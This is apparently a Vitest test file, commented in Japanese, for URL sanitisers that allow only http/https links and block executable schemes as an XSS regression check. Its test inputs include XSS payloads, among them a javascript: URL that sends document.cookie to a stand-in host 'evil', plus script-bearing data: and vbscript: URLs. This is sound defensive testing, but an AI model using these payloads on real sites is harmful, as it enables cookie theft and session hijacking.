import { describe, it, expect } from "vitest";
import { isHttpUrl, safeExternalHref } from "../safe-url";

describe("isHttpUrl", () => {
  it("http/https の絶対URLを許可する", () => {
    expect(isHttpUrl("https://example.com/user")).toBe(true);
    expect(isHttpUrl("http://example.com")).toBe(true);
    expect(isHttpUrl("https://sub.example.com/path?q=1#frag")).toBe(true);
    expect(isHttpUrl("HTTPS://EXAMPLE.COM")).toBe(true);
  });

  it("実行可能スキームを拒否する（XSS対策の回帰テスト）", () => {
    expect(isHttpUrl("javascript:alert(1)")).toBe(false);
    expect(isHttpUrl("javascript:fetch('//evil/'+document.cookie)")).toBe(false);
    expect(isHttpUrl("JavaScript:alert(1)")).toBe(false);
    expect(isHttpUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
    expect(isHttpUrl("vbscript:msgbox(1)")).toBe(false);
  });

  it("http/https 以外のスキーム・相対URL・不正値を拒否する", () => {
    expect(isHttpUrl("mailto:foo@example.com")).toBe(false);
    expect(isHttpUrl("ftp://example.com/file")).toBe(false);
    expect(isHttpUrl("/relative/path")).toBe(false);
    expect(isHttpUrl("example.com")).toBe(false);
    expect(isHttpUrl("not a url")).toBe(false);
    expect(isHttpUrl("")).toBe(false);
    expect(isHttpUrl(null)).toBe(false);
    expect(isHttpUrl(undefined)).toBe(false);
  });
});

describe("safeExternalHref", () => {
  it("http/https の値はそのまま返す", () => {
    expect(safeExternalHref("https://example.com/user")).toBe("https://example.com/user");
    expect(safeExternalHref("http://example.com")).toBe("http://example.com");
  });

  it("http/https 以外は undefined を返す（href を出力させない）", () => {
    expect(safeExternalHref("javascript:alert(1)")).toBeUndefined();
    expect(safeExternalHref("data:text/html,<script>alert(1)</script>")).toBeUndefined();
    expect(safeExternalHref("mailto:foo@example.com")).toBeUndefined();
    expect(safeExternalHref("")).toBeUndefined();
    expect(safeExternalHref(null)).toBeUndefined();
    expect(safeExternalHref(undefined)).toBeUndefined();
  });
});
